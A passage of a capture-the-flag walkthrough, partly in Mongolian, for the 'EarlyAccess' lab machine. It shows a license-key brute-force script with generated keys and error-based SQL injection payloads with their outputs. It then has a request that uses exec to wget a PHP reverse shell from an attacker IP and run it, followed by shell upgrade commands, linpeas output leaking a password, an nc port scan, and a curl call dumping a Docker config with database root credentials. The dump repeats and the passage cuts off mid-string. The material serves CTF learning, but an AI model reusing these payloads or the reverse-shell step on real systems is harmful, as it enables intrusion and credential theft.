invalid!\u0026#39;) return False if not self.g1_valid(): return False if not self.g2_valid(): return False if not self.g3_valid(): return False if not self.g4_valid(): return False if not self.cs_valid(): print(\u0026#39;[Critical] Checksum verification failed!\u0026#39;) return False return True if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 2: print(Key.info()) sys.exit(-1) input = sys.argv[1] validator = Key(input) if validator.check(): print(f\u0026#34;Entered key is valid!\u0026#34;) else: print(f\u0026#34;Entered key is invalid!\u0026#34;) Note: Python ord() function returns the Unicode code from a given character. This function accepts a string of unit length as an argument and returns the Unicode equivalence of the passed argument. In other words, given a string of length 1, the ord() function returns an integer representing the Unicode code point of the character when an argument is a Unicode object, or the value of the byte when the argument is an 8-bit string.\n#!/usr/bin/env python3 import string AtoZ = list(string.ascii_uppercase) digits = list(string.digits) all_strings = AtoZ + digits print(all_strings) i = 2 for v in all_strings: r = [(ord(v) \u0026lt;\u0026lt; i + 1) % 256 ^ ord(v)] if r[0] == int(145): print(v) print(v, \u0026#34;\u0026lt;--\u0026gt;\u0026#34;, sum(bytearray(v.encode()))) [\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;G\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;J\u0026#39;, \u0026#39;K\u0026#39;, \u0026#39;L\u0026#39;, \u0026#39;M\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;P\u0026#39;, \u0026#39;Q\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;S\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;U\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;Z\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;] A \u0026lt;--\u0026gt; 65 B \u0026lt;--\u0026gt; 66 C \u0026lt;--\u0026gt; 67 D \u0026lt;--\u0026gt; 68 E \u0026lt;--\u0026gt; 69 F \u0026lt;--\u0026gt; 70 G \u0026lt;--\u0026gt; 71 H \u0026lt;--\u0026gt; 72 I \u0026lt;--\u0026gt; 73 J \u0026lt;--\u0026gt; 74 K \u0026lt;--\u0026gt; 75 L \u0026lt;--\u0026gt; 76 M \u0026lt;--\u0026gt; 77 N \u0026lt;--\u0026gt; 78 O \u0026lt;--\u0026gt; 79 P \u0026lt;--\u0026gt; 80 Q \u0026lt;--\u0026gt; 81 R \u0026lt;--\u0026gt; 82 S \u0026lt;--\u0026gt; 83 T \u0026lt;--\u0026gt; 84 U \u0026lt;--\u0026gt; 85 V \u0026lt;--\u0026gt; 86 W \u0026lt;--\u0026gt; 87 X \u0026lt;--\u0026gt; 88 Y Y \u0026lt;--\u0026gt; 89 Z \u0026lt;--\u0026gt; 90 0 \u0026lt;--\u0026gt; 48 1 \u0026lt;--\u0026gt; 49 2 \u0026lt;--\u0026gt; 50 3 \u0026lt;--\u0026gt; 51 4 \u0026lt;--\u0026gt; 52 5 \u0026lt;--\u0026gt; 53 6 \u0026lt;--\u0026gt; 54 7 \u0026lt;--\u0026gt; 55 8 \u0026lt;--\u0026gt; 56 9 \u0026lt;--\u0026gt; 57 magic_num = 346 178 = 346 - 168\nmin = 178 ALPHABET1 = \u0026#34;ABCDEFGHJKLMNOPQSTYUWZ\u0026#34; NUM = \u0026#34;0123456789\u0026#34; for x in ALPHABET1: for y in ALPHABET1: for z in NUM: res = int(ord(x)) + int(ord(y)) + int(ord(z)) if res \u0026gt;= min: group = \u0026#34;XP\u0026#34; + x + y + z gs = [\u0026#34;KEY19\u0026#34;, \u0026#34;1A1R1\u0026#34;] gs.append(group) gs.append(\u0026#34;GAMD9\u0026#34;) lastgrp = sum([sum(bytearray(g.encode())) for g in gs]) print(\u0026#34;KEY19-1A1R1-\u0026#34; + group + \u0026#34;-GAMD9-\u0026#34; + str(lastgrp)) min = min + 1 KEY19-1A1R1-XPAA0-GAMD9-1317 KEY19-1A1R1-XPAA1-GAMD9-1318 KEY19-1A1R1-XPAA2-GAMD9-1319 KEY19-1A1R1-XPAA3-GAMD9-1320 KEY19-1A1R1-XPAA4-GAMD9-1321 KEY19-1A1R1-XPAA5-GAMD9-1322 KEY19-1A1R1-XPAA6-GAMD9-1323 KEY19-1A1R1-XPAA7-GAMD9-1324 KEY19-1A1R1-XPAA8-GAMD9-1325 KEY19-1A1R1-XPAA9-GAMD9-1326 KEY19-1A1R1-XPAB9-GAMD9-1327 KEY19-1A1R1-XPAC9-GAMD9-1328 KEY19-1A1R1-XPAD9-GAMD9-1329 KEY19-1A1R1-XPAE9-GAMD9-1330 KEY19-1A1R1-XPAF9-GAMD9-1331 KEY19-1A1R1-XPAG9-GAMD9-1332 KEY19-1A1R1-XPAH9-GAMD9-1333 KEY19-1A1R1-XPAJ8-GAMD9-1334 KEY19-1A1R1-XPAJ9-GAMD9-1335 KEY19-1A1R1-XPAK9-GAMD9-1336 KEY19-1A1R1-XPAL9-GAMD9-1337 KEY19-1A1R1-XPAM9-GAMD9-1338 KEY19-1A1R1-XPAN9-GAMD9-1339 KEY19-1A1R1-XPAO9-GAMD9-1340 KEY19-1A1R1-XPAP9-GAMD9-1341 KEY19-1A1R1-XPAQ9-GAMD9-1342 KEY19-1A1R1-XPAS8-GAMD9-1343 KEY19-1A1R1-XPAS9-GAMD9-1344 KEY19-1A1R1-XPAT9-GAMD9-1345 KEY19-1A1R1-XPAY5-GAMD9-1346 KEY19-1A1R1-XPAY6-GAMD9-1347 KEY19-1A1R1-XPAY7-GAMD9-1348 KEY19-1A1R1-XPAY8-GAMD9-1349 KEY19-1A1R1-XPAY9-GAMD9-1350 KEY19-1A1R1-XPAZ9-GAMD9-1351 KEY19-1A1R1-XPBZ9-GAMD9-1352 KEY19-1A1R1-XPCZ9-GAMD9-1353 KEY19-1A1R1-XPDZ9-GAMD9-1354 KEY19-1A1R1-XPEZ9-GAMD9-1355 KEY19-1A1R1-XPFZ9-GAMD9-1356 KEY19-1A1R1-XPGZ9-GAMD9-1357 KEY19-1A1R1-XPHZ9-GAMD9-1358 KEY19-1A1R1-XPJY9-GAMD9-1359 KEY19-1A1R1-XPJZ9-GAMD9-1360 KEY19-1A1R1-XPKZ9-GAMD9-1361 KEY19-1A1R1-XPLZ9-GAMD9-1362 KEY19-1A1R1-XPMZ9-GAMD9-1363 KEY19-1A1R1-XPNZ9-GAMD9-1364 KEY19-1A1R1-XPOZ9-GAMD9-1365 KEY19-1A1R1-XPPZ9-GAMD9-1366 KEY19-1A1R1-XPQZ9-GAMD9-1367 KEY19-1A1R1-XPSY9-GAMD9-1368 KEY19-1A1R1-XPSZ9-GAMD9-1369 KEY19-1A1R1-XPTZ9-GAMD9-1370 KEY19-1A1R1-XPYY6-GAMD9-1371 KEY19-1A1R1-XPYY7-GAMD9-1372 KEY19-1A1R1-XPYY8-GAMD9-1373 KEY19-1A1R1-XPYY9-GAMD9-1374 KEY19-1A1R1-XPYZ9-GAMD9-1375 KEY19-1A1R1-XPZZ9-GAMD9-1376 Дээр байгаа боломжит түхлүүр бүрээр валид хийхийг нь оруулаад dev. subdomain руу орно. Энэ хэсгээс SQL Injection.\nэнэ одоогоор ажиллаж байна\nKEY19-1A1R1-XPAQ9-GAMD9-1342 4.1 SQL Injection game болон earlyaccess бүртгэлтэй хэрэглэгчийн нэрийг порфайл хэсгээс өөрчилж үзнэ.\nca4mi\u0026#39;) and updatexml(1,concat(0x7e,(@@version),0x7e),1) # Result (@Scoreboard):\nSQLSTATE[HY000]: General error: 1105 XPATH syntax error: \u0026#39;~8.0.25~\u0026#39; sql injection #1:\nca4mi\u0026#39;) and updatexml(1,make_set(3,\u0026#39;\u0026#39;,(select table_name from information_schema.tables where table_schema=database() limit 2,1)),1) # Result:\nSQLSTATE[HY000]: General error: 1105 XPATH syntax error: \u0026#39;,users\u0026#39; sql injection #2:\njade\u0026#39;) and updatexml(1,make_set(3,\u0026#39;\u0026#39;,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 1,1)),1) # Result\nSQLSTATE[HY000]: General error: 1105 XPATH syntax error: \u0026#39;,email\u0026#39; sql injection #3:\nca4mi\u0026#39;) and updatexml(1,make_set(3,\u0026#39;\u0026#39;,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 5,1)),1) # Result:\nSQLSTATE[HY000]: General error: 1105 XPATH syntax error: \u0026#39;,password\u0026#39; Ингэж sql injection хийж яваад admin@earlyaccess.htb хэрэглэгчийн нууц үгийг database -с олоод hash - г тайлаад dev.earlyaccess.htb руу админ нэр нууц үгээр нэвтрэн орж hash.php хэсэгт listener асаах юм байна.\nhttps://github.com/pentestmonkey/php-reverse-shell - reverse shell татаж аваад ip, port локал vm болгож солиод hash.php хэсэгт дараах маягаар action хийнэ. Локал VM дээр http.server, nc асаана.\nPOST /actions/hash.php HTTP/1.1 Host: dev.earlyaccess.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 121 Origin: http://dev.earlyaccess.htb DNT: 1 Connection: close Referer: http://dev.earlyaccess.htb/home.php?tool=hashing Cookie: PHPSESSID=079a3696c6388d0aa3a74e9ed793e559 Upgrade-Insecure-Requests: 1 Sec-GPC: 1 action=hash\u0026amp;hash_function=exec\u0026amp;password=wget http://10.10.14.7:8000/php-reverse-shell.php -O /tmp/1.php;php /tmp/1.php\u0026amp;debug=1 4.2 Shell balance: python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо:\nexport TERM=xterm su -l www-adm 4.3 linpeas [+] Finding passwords inside key folders (limit 70) - no PHP files bash: line 2185: printf: `?\u0026#39;: invalid format character /home/www-adm/.wgetrc:password=s3CuR3_API_PW! [+] Networks and neighbours Iface\tDestination\tGateway Flags\tRefCnt\tUse\tMetric\tMask\tMTU\tWindow\tIRTT eth0\t00000000\t010012AC\t0003\t0\t0\t0\t00000000\t000 eth0\t000012AC\t00000000\t0001\t0\t0\t0\t0000FFFF\t000 IP address HW type Flags HW address Mask Device 172.18.0.2 0x1 0x2 02:42:ac:12:00:02 * eth0 172.18.0.100 0x1 0x2 02:42:ac:12:00:64 * eth0 172.18.0.1 0x1 0x2 02:42:b1:d2:79:25 * eth0 172.18.0.101 0x1 0x2 02:42:ac:12:00:65 * eth0 nc -v -z -n 172.18.0.1 1-65535 (UNKNOWN) [172.18.0.1] 443 (https) open (UNKNOWN) [172.18.0.1] 80 (http) open (UNKNOWN) [172.18.0.1] 22 (ssh) open curl -u \u0026#39;api:s3CuR3_API_PW!\u0026#39; http://172.18.0.101:5000/check_db {\u0026#34;message\u0026#34;:{\u0026#34;AppArmorProfile\u0026#34;:\u0026#34;docker-default\u0026#34;,\u0026#34;Args\u0026#34;:[\u0026#34;--character-set-server=utf8mb4\u0026#34;,\u0026#34;--collation-server=utf8mb4_bin\u0026#34;,\u0026#34;--skip-character-set-client-handshake\u0026#34;,\u0026#34;--max_allowed_packet=50MB\u0026#34;,\u0026#34;--general_log=0\u0026#34;,\u0026#34;--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES\u0026#34;],\u0026#34;Config\u0026#34;:{\u0026#34;AttachStderr\u0026#34;:false,\u0026#34;AttachStdin\u0026#34;:false,\u0026#34;AttachStdout\u0026#34;:false,\u0026#34;Cmd\u0026#34;:[\u0026#34;--character-set-server=utf8mb4\u0026#34;,\u0026#34;--collation-server=utf8mb4_bin\u0026#34;,\u0026#34;--skip-character-set-client-handshake\u0026#34;,\u0026#34;--max_allowed_packet=50MB\u0026#34;,\u0026#34;--general_log=0\u0026#34;,\u0026#34;--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES\u0026#34;],\u0026#34;Domainname\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Entrypoint\u0026#34;:[\u0026#34;docker-entrypoint.sh\u0026#34;],\u0026#34;Env\u0026#34;:[\u0026#34;MYSQL_DATABASE=db\u0026#34;,\u0026#34;MYSQL_USER=drew\u0026#34;,\u0026#34;MYSQL_PASSWORD=drew\u0026#34;,\u0026#34;MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5\u0026#34;,\u0026#34;SERVICE_TAGS=dev\u0026#34;,\u0026#34;SERVICE_NAME=mysql\u0026#34;,\u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;,\u0026#34;GOSU_VERSION=1.12\u0026#34;,\u0026#34;MYSQL_MAJOR=8.0\u0026#34;,\u0026#34;MYSQL_VERSION=8.0.25-1debian10\u0026#34;],\u0026#34;ExposedPorts\u0026#34;:{\u0026#34;3306/tcp\u0026#34;:{},\u0026#34;33060/tcp\u0026#34;:{}},\u0026#34;Healthcheck\u0026#34;:{\u0026#34;Interval\u0026#34;:5000000000,\u0026#34;Retries\u0026#34;:3,\u0026#34;Test\u0026#34;:[\u0026#34;CMD-SHELL\u0026#34;,\u0026#34;mysqladmin ping -h 127.0.0.1 --user=$MYSQL_USER -p$MYSQL_PASSWORD --silent\u0026#34;],\u0026#34;Timeout\u0026#34;:2000000000},\u0026#34;Hostname\u0026#34;:\u0026#34;mysql\u0026#34;,\u0026#34;Image\u0026#34;:\u0026#34;mysql:latest\u0026#34;,\u0026#34;Labels\u0026#34;:{\u0026#34;com.docker.compose.config-hash\u0026#34;:\u0026#34;947cb358bc0bb20b87239b0dffe00fd463bd7e10355f6aac2ef1044d8a29e839\u0026#34;,\u0026#34;com.docker.compose.container-number\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;com.docker.compose.oneoff\u0026#34;:\u0026#34;False\u0026#34;,\u0026#34;com.docker.compose.project\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;com.docker.compose.project.config_files\u0026#34;:\u0026#34;docker-compose.yml\u0026#34;,\u0026#34;com.docker.compose.project.working_dir\u0026#34;:\u0026#34;/root/app\u0026#34;,\u0026#34;com.docker.compose.service\u0026#34;:\u0026#34;mysql\u0026#34;,\u0026#34;com.docker.compose.version\u0026#34;:\u0026#34;1.29.1\u0026#34;},\u0026#34;OnBuild\u0026#34;:null,\u0026#34;OpenStdin\u0026#34;:false,\u0026#34;StdinOnce\u0026#34;:false,\u0026#34;Tty\u0026#34;:true,\u0026#34;User\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Volumes\u0026#34;:{\u0026#34;/docker-entrypoint-initdb.d\u0026#34;:{},\u0026#34;/var/lib/mysql\u0026#34;:{}},\u0026#34;WorkingDir\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;Created\u0026#34;:\u0026#34;2022-01-07T08:12:13.704127504Z\u0026#34;,\u0026#34;Driver\u0026#34;:\u0026#34;overlay2\u0026#34;,\u0026#34;ExecIDs\u0026#34;:null,\u0026#34;GraphDriver\u0026#34;:{\u0026#34;Data\u0026#34;:{\u0026#34;LowerDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a-init/diff:/var/lib/docker/overlay2/ecc064365b0367fc58ac796d9d5fe020d9453c68e2563f8f6d4682e38231083e/diff:/var/lib/docker/overlay2/4a21c5c296d0e6d06a3e44e3fa4817ab6f6f8c3612da6ba902dc28ffd749ec4d/diff:/var/lib/docker/overlay2/f0cdcc7bddc58609f75a98300c16282d8151ce18bd89c36be218c52468b3a643/diff:/var/lib/docker/overlay2/01e8af3c602aa396e4cb5af2ed211a6a3145337fa19b123f23e36b006d565fd0/diff:/var/lib/docker/overlay2/55b88ae64530676260fe91d4d3e6b0d763165505d3135a3495677cb10de74a66/diff:/var/lib/docker/overlay2/4064491ac251bcc0b677b0f76de7d5ecf0c17c7d64d7a18debe8b5a99e73e127/diff:/var/lib/docker/overlay2/a60c199d618b0f2001f106393236ba394d683a96003a4e35f58f8a7642dbad4f/diff:/var/lib/docker/overlay2/29b638dc55a69c49df41c3f2ec0f90cc584fac031378ae455ed1458a488ec48d/diff:/var/lib/docker/overlay2/ee59a9d7b93adc69453965d291e66c7d2b3e6402b2aef6e77d367da181b8912f/diff:/var/lib/docker/overlay2/4b5204c09ec7b0cbf22d409408529d79a6d6a472b3c4d40261aa8990ff7a2ea8/diff:/var/lib/docker/overlay2/8178a3527c2a805b3c2fe70e179797282bb426f3e73e8f4134bc2fa2f2c7aa22/diff:/var/lib/docker/overlay2/76b10989e43e43406fc4306e789802258e36323f7c2414e5e1242b6eab4bd3eb/diff\u0026#34;,\u0026#34;MergedDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a/merged\u0026#34;,\u0026#34;UpperDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a/diff\u0026#34;,\u0026#34;WorkDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a/work\u0026#34;},\u0026#34;Name\u0026#34;:\u0026#34;overlay2\u0026#34;},\u0026#34;HostConfig\u0026#34;:{\u0026#34;AutoRemove\u0026#34;:false,\u0026#34;Binds\u0026#34;:[\u0026#34;/root/app/scripts/init.d:/docker-entrypoint-initdb.d:ro\u0026#34;,\u0026#34;app_vol_mysql:/var/lib/mysql:rw\u0026#34;],\u0026#34;BlkioDeviceReadBps\u0026#34;:null,\u0026#34;BlkioDeviceReadIOps\u0026#34;:null,\u0026#34;BlkioDeviceWriteBps\u0026#34;:null,\u0026#34;BlkioDeviceWriteIOps\u0026#34;:null,\u0026#34;BlkioWeight\u0026#34;:0,\u0026#34;BlkioWeightDevice\u0026#34;:null,\u0026#34;CapAdd\u0026#34;:[\u0026#34;SYS_NICE\u0026#34; {\u0026#34;message\u0026#34;:{\u0026#34;AppArmorProfile\u0026#34;:\u0026#34;docker-default\u0026#34;,\u0026#34;Args\u0026#34;:[\u0026#34;--character-set-server=utf8mb4\u0026#34;,\u0026#34;--collation-server=utf8mb4_bin\u0026#34;,\u0026#34;--skip-character-set-client-handshake\u0026#34;,\u0026#34;--max_allowed_packet=50MB\u0026#34;,\u0026#34;--general_log=0\u0026#34;,\u0026#34;--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES\u0026#34;],\u0026#34;Config\u0026#34;:{\u0026#34;AttachStderr\u0026#34;:false,\u0026#34;AttachStdin\u0026#34;:false,\u0026#34;AttachStdout\u0026#34;:false,\u0026#34;Cmd\u0026#34;:[\u0026#34;--character-set-server=utf8mb4\u0026#34;,\u0026#34;--collation-server=utf8mb4_bin\u0026#34;,\u0026#34;--skip-character-set-client-handshake\u0026#34;,\u0026#34;--max_allowed_packet=50MB\u0026#34;,\u0026#34;--general_log=0\u0026#34;,\u0026#34;--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES\u0026#34;],\u0026#34;Domainname\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Entrypoint\u0026#34;:[\u0026#34;docker-entrypoint.sh\u0026#34;],\u0026#34;Env\u0026#34;:[\u0026#34;MYSQL_DATABASE=db\u0026#34;,\u0026#34;MYSQL_USER=drew\u0026#34;,\u0026#34;MYSQL_PASSWORD=drew\u0026#34;,\u0026#34;MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5\u0026#34;,\u0026#34;SERVICE_TAGS=dev\u0026#34;,\u0026#34;SERVICE_NAME=mysql\u0026#34;,\u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;,\u0026#34;GOSU_VERSION=1.12\u0026#34;,\u0026#34;MYSQL_MAJOR=8.0\u0026#34;,\u0026#34;MYSQL_VERSION=8.0.25-1debian10\u0026#34;],\u0026#34;ExposedPorts\u0026#34;:{\u0026#34;3306/tcp\u0026#34;:{},\u0026#34;33060/tcp\u0026#34;:{}},\u0026#34;Healthcheck\u0026#34;:{\u0026#34;Interval\u0026#34;:5000000000,\u0026#34;Retries\u0026#34;:3,\u0026#34;Test\u0026#34;:[\u0026#34;CMD-SHELL\u0026#34;,\u0026#34;mysqladmin ping -h 127.0.0.1 --user=$MYSQL_USER -p$MYSQL_PASSWORD --silent\u0026#34;],\u0026#34;Timeout\u0026#34;:2000000000},\u0026#34;Hostname\u0026#34;:\u0026#34;mysql\u0026#34;,\u0026#34;Image\u0026#34;:\u0026#34;mysql:latest\u0026#34;,\u0026#34;Labels\u0026#34;:{\u0026#34;com.docker.compose.config-hash\u0026#34;:\u0026#34;947cb358bc0bb20b87239b0dffe00fd463bd7e10355f6aac2ef1044d8a29e839\u0026#34;,\u0026#34;com.docker.compose.container-number\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;com.docker.compose.oneoff\u0026#34;:\u0026#34;False\u0026#34;,\u0026#34;com.docker.compose.project\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;com.docker.compose.project.config_files\u0026#34;:\u0026#34;docker-compose.yml\u0026#34;,\u0026#34;com.docker.compose.project.working_dir\u0026#34;:\u0026#34;/root/app\u0026#34;,\u0026#34;com.docker.compose.service\u0026#34;:\u0026#34;mysql\u0026#34;,\u0026#34;com.docker.compose.version\u0026#34;:\u0026#34;1.29.1\u0026#34;},\u0026#34;OnBuild\u0026#34;:null,\u0026#34;OpenStdin\u0026#34;:false,\u0026#34;StdinOnce\u0026#34;:false,\u0026#34;Tty\u0026#34;:true,\u0026#34;User\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Volumes\u0026#34;:{\u0026#34;/docker-entrypoint-initdb.d\u0026#34;:{},\u0026#34;/var/lib/mysql\u0026#34;:{}},\u0026#34;WorkingDir\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;Created\u0026#34;:\u0026#34;2022-01-07T08:12:13.704127504Z\u0026#34;,\u0026#34;Driver\u0026#34;:\u0026#34;overlay2\u0026#34;,\u0026#34;ExecIDs\u0026#34;:null,\u0026#34;GraphDriver\u0026#34;:{\u0026#34;Data\u0026#34;:{\u0026#34;LowerDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a-init/diff:/var/lib/docker/overlay2/ecc064365b0367fc58ac796d9d5fe020d9453c68e2563f8f6d4682e38231083e/diff:/var/lib/docker/overlay2/4a21c5c296d0e6d06a3e44e3fa4817ab6f6f8c3612da6ba902dc28ffd749ec4d/diff:/var/lib/docker/overlay2/f0cdcc7bddc58609f75a98300c16282d8151ce18bd89c36be218c52468b3a643/diff:/var/lib/docker/overlay2/01e8af3c602aa396e4cb5af2ed211a6a3145337fa19b123f23e36b006d565fd0/diff:/var/lib/docker/overlay2/55b88ae64530676260fe91d4d3e6b0d763165505d3135a3495677cb10de74a66/diff:/var/lib/docker/overlay2/4064491ac251bcc0b677b0f76de7d5ecf0c17c7d64d7a18debe8b5a99e73e127/diff:/var/lib/docker/overlay2/a60c199d618b0f2001f106393236ba394d683a96003a4e35f58f8a7642dbad4f/diff:/var/lib/docker/overlay2/29b638dc55a69c49df41c3f2ec0f90cc584fac031378ae455ed1458a488ec48d/diff:/var/lib/docker/overlay2/ee59a9d7b93adc69453965d291e66c7d2b3e6402b2aef6e77d367da181b8912f/diff:/var/lib/docker/overlay2/4b5204c09ec7b0cbf22d409408529d79a6d6a472b3c4d40261aa8990ff7a2ea8/diff:/var/lib/docker/overlay2/8178a3527c2a805b3c2fe70e179797282bb426f3e73e8f4134bc2fa2f2c7aa22/diff:/var/lib/docker/overlay2/76b10989e43e43406fc4306e789802258e36323f7c2414e5e1242b6eab4bd3eb/diff\u0026#34;,\u0026#34;MergedDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a/merged\u0026#34;,\u0026#34;UpperDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a/diff\u0026#34;,\u0026#34;WorkDir\u0026#34;:\u0026#34;/var/lib/docker/overlay2/ae979fa9158b6134ba08b7c587648c193d3fb8be2283dc5173a1e7403f0ff72a/work\u0026#34;},\u0026#34;Name\u0026#34;:\u0026#34;overlay2\u0026#34;},\u0026#34;HostConfig\u0026#34;:{\u0026#34;AutoRemove\u0026#34;:false,\u0026#34;Binds\u0026#34;:[\u0026#34;/root/app/scripts/init.d:/docker-entrypoint-initdb.d:ro\u0026#34;,\u0026#34;app_vol_mysql:/var/lib/mysql:rw\u0026#34;],\u0026#34;BlkioDeviceReadBps\u0026#34;:null,\u0026#34;BlkioDeviceReadIOps\u0026#34;:null,\u0026#34;BlkioDeviceWriteBps\u0026#34;:null,\u0026#34;BlkioDeviceWriteIOps\u0026#34;:null,\u0026#34;BlkioWeight\u0026#34;:0,\u0026#34;BlkioWeightDevice\u0026#34;:null,\u0026#34;CapAdd\u0026#34;:[\u0026#34;SYS_NICE\u0026#34; {\u0026#34;message\u0026#34;:{\u0026#34;AppArmorProfile\u0026#34;:\u0026#34;docker-default\u0026#34;,\u0026#34;Args\u0026#34;:[\u0026#34;--character-set-server=utf8mb4\u0026#34;,\u0026#34;--collation-server=utf8mb4_bin\u0026#34;,\u0026#34;--skip-character-set-client-handshake\u0026#34;,\u0026#34;--max_allowed_packet=50MB\u0026#34;,\u0026#34;--general_log=0\u0026#34;,\u0026#34;--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES\u0026#34;],\u0026#34;Config\u0026#34;:{\u0026#34;AttachStderr\u0026#34;:false,\u0026#34;AttachStdin\u0026#34;:false,\u0026#34;AttachStdout\u0026#34;:false,\u0026#34;Cmd\u0026#34;:[\u0026#34;--character-set-server=utf8mb4\u0026#34;,\u0026#34;--collation-server=utf8mb4_bin\u0026#34;,\u0026#34;--skip-character-set-client-handshake\u0026#34;,\u0026#34;--max_allowed_packet=50MB\u0026#34;,\u0026#34;--general_log=0\u0026#34;,\u0026#34;--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES\u0026#34;],\u0026#34;Domainname\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Entrypoint\u0026#34;:[\u0026#34;docker-entrypoint.sh\u0026#34;],\u0026#34;Env\u0026#34;:[\u0026#34;MYSQL_DATABASE=db\u0026#34;,\u0026#34;MYSQL_USER=drew\u0026#34;,\u0026#34;MYSQL_PASSWORD=drew\u0026#34;,\u0026#34;MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5\u0026#34;,\u0026#34;SERVICE_TAGS=dev\u0026#34;,\u0026#34;SERVICE_NAME=mysql\u0026#34;,\u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;,\u0026#34;GOSU_VERSION=1.12\u0026#34;,\u0026#34;MYSQL_MAJOR=8.0\u0026#34;,\u0026#34;MYSQL_VERSION=8.0.25-1debian10\u0026#34;],\u0026#34;ExposedPorts\u0026#34;:{\u0026#34;3306/tcp\u0026#34;:{},\u0026#34;33060/tcp\u0026#34;:{}},\u0026#34;Healthcheck\u0026#34;:{\u0026#34;Interval\u0026#34;:5000000000,\u0026#34;Retries\u0026#34;:3,\u0026#34;Test\u0026#34;:[\u0026#34;CMD-SHELL\u0026#34;,\u0026#34;mysqladmin ping -h 127.0.0.1 --user=$MYSQL_USER -p$MYSQL_PASSWORD 